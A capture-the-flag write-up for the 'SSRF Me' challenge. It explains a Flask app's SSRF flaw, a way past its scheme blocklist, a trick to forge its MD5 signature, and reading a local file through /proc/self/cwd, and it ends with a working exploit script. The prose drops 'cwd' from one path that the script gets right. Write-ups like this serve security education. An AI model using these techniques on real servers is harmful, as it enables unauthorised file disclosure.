# SSRF Me - Writeup 
##### By *sh4d0w58*

### Description:

>SSRF ME TO GET FLAG. [http://139.180.128.86/](http://139.180.128.86/)

### Solution:

On visiting [http://139.180.128.86/](http://139.180.128.86/) we are given the source code of the Flask App that we are interfacing with:

```
#! /usr/bin/env python 
#encoding=utf-8 
from flask import Flask 
from flask import request 
import socket 
import hashlib 
import urllib 
import sys 
import os 
import json 

reload(sys) 
sys.setdefaultencoding('latin1') 
app = Flask(__name__) 
secert_key = os.urandom(16) 

class Task: 
	def __init__(self, action, param, sign, ip): 
		self.action = action 
		self.param = param 
		self.sign = sign 
		self.sandbox = md5(ip) 
		if(not os.path.exists(self.sandbox)): 
			#SandBox For Remote_Addr 
			os.mkdir(self.sandbox) 

	def Exec(self): 
		result = {} 
		result['code'] = 500 
		if (self.checkSign()): 
			if "scan" in self.action: 
				tmpfile = open("./%s/result.txt" % self.sandbox, 'w') 
				resp = scan(self.param) 
				if (resp == "Connection Timeout"): 
					result['data'] = resp 
				else: 
					print resp 
					tmpfile.write(resp) 
					tmpfile.close()
					result['code'] = 200 
			if "read" in self.action: 
				f = open("./%s/result.txt" % self.sandbox, 'r') 
				result['code'] = 200 
				result['data'] = f.read() 
			if result['code'] == 500: 
				result['data'] = "Action Error" 
		else: 
			result['code'] = 500 
			result['msg'] = "Sign Error" 
		return result 

	def checkSign(self): 
		if (getSign(self.action, self.param) == self.sign): 
			return True 
		else: 
			return False 

#generate Sign For Action Scan. 
@app.route("/geneSign", methods=['GET', 'POST']) 
def geneSign(): 
	param = urllib.unquote(request.args.get("param", "")) 
	action = "scan" 
	return getSign(action, param) 

@app.route('/De1ta',methods=['GET','POST']) 
def challenge(): 
	action = urllib.unquote(request.cookies.get("action")) 
	param = urllib.unquote(request.args.get("param", "")) 
	sign = urllib.unquote(request.cookies.get("sign")) 
	ip = request.remote_addr 
	if(waf(param)): 
		return "No Hacker!!!!" 
	task = Task(action, param, sign, ip) 
	return json.dumps(task.Exec()) 

@app.route('/') 
def index(): 
	return open("code.txt","r").read() 

def scan(param): 
	socket.setdefaulttimeout(1) 
	try: 
		return urllib.urlopen(param).read()[:50] 
	except: 
		return "Connection Timeout" 

def getSign(action, param): 
	return hashlib.md5(secert_key + param + action).hexdigest() 

def md5(content): 
	return hashlib.md5(content).hexdigest()

def waf(param): 
	check=param.strip().lower() 
	if check.startswith("gopher") or check.startswith("file"): 
		return True 
	else: 
		return False 

if __name__ == '__main__': 
	app.debug = False 
	app.run(host='0.0.0.0',port=80)
```

Looking over it, we see that visiting `"/De1ta"` will execute the `challenge()` function and construct a new `Task` object with an `action`, `param`, and `sign` that we provide as cookies and a GET parameter. (Also our `ip` is passed to it). Then it will call the `Exec()` method of the object and return the json result.

```
task = Task(action, param, sign, ip) 
return json.dumps(task.Exec()) 
```

Inside `Exec()`, `checkSign()` is called. This function checks whether the `sign` value is the same as the value generated by `getSign()`. We have to pass this check to move on to the rest of `Exec()`.

```
def checkSign(self): 
		if (getSign(self.action, self.param) == self.sign): 
			return True 
		else: 
			return False
```

`getSign()` performs an md5 hash with `secret_key + param + action`. `secret_key` is a random value that is generated by the App, so we don't know it.

```
def getSign(action, param): 
	return hashlib.md5(secert_key + param + action).hexdigest() 
``` 

So now we need a way to generate a valid sign. Making a request to `/geneSign` will generate a `sign` value for us, however it will only allow us to pass it the `param` value and the `action` value will be set to `"scan"`.

```
@app.route("/geneSign", methods=['GET', 'POST']) 
def geneSign(): 
	param = urllib.unquote(request.args.get("param", "")) 
	action = "scan" 
	return getSign(action, param) 
```

Now that we can generate a valid `sign` value, we can pass the check and move on to the rest of `Exec()`. The first `if` case checks if `"scan"` is `in` `action`. Notice, it does not check whether `action == "scan"`, only whether it contains it. This will be important later. The `"scan"` action will make a request with the value of `param` and write it to a file.

```
if "scan" in self.action: 
	tmpfile = open("./%s/result.txt" % self.sandbox, 'w') 
	resp = scan(self.param) 
	if (resp == "Connection Timeout"): 
		result['data'] = resp 
	else: 
		print resp 
		tmpfile.write(resp) 
		tmpfile.close()
		result['code'] = 200 
```

The second `if` case performs the same check with `"read"`. This action will read the file that we just wrote the result of `"scan"` to.

```
if "read" in self.action: 
	f = open("./%s/result.txt" % self.sandbox, 'r') 
	result['code'] = 200 
	result['data'] = f.read() 
```

Going back to the `"scan"` case, we see the function `scan()` is called with our `param`. This function will use `urllib.urlopen()` to perform the request and this is where the SSRF vulnerability is.

```
def scan(param): 
	socket.setdefaulttimeout(1) 
	try: 
		return urllib.urlopen(param).read()[:50] 
	except: 
		return "Connection Timeout" 
```

To read local files we could use the `"file://"` protocol, however any `param` value that starts with `"file"` or `"gopher"` is blocked in the `challenge()` function. I believe there are multiple ways to get past this, but I noticed that starting `param` with a `"/"` would attempt to read files from the root of the file system. The challenge hint says...

>flag is in ./flag.txt

...however we do not know the current working directory (CWD) and therefore where `"."` is. We can use a trick to get past this. `"/proc/self/cwd"` is a symlink to the process' CWD. We can read the flag with `"/proc/self/cwd/flag.txt"`.

This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action **including** `"read"`. If we can generate a sign for the `action` as `"readscan"`, we can perform the scan and read the result in one go.

Notice, `geneSign()` will perform an md5 hash of `secret + param + action` so we can pass the value of `param` as `"/proc/self/flag.txtread"` (the value of `action` will be `"scan"`) and generate the *same* hash as if we pass `param` as `"/proc/self/flag.txt"` and `action` as `"readscan"`.

```"/proc/self/flag.txtread"+"scan" == "/proc/self/flag.txt"+"readscan"```

So our exploit is complete.

We get the flag `"de1ctf{27782fcffbb7d00309a93bc49b74ca26}"`

###Full Code:

```
import requests

def geneSign(param):
	return requests.get("http://139.180.128.86/geneSign?param="+param).text

realParam = "/proc/self/cwd/flag.txt"

param = realParam+"read"
sign = geneSign(param)
param = realParam

action = "readscan"

answer = requests.get("http://139.180.128.86/De1ta?param="+param, cookies={"action":action,"sign":sign}).text

print(answer)
```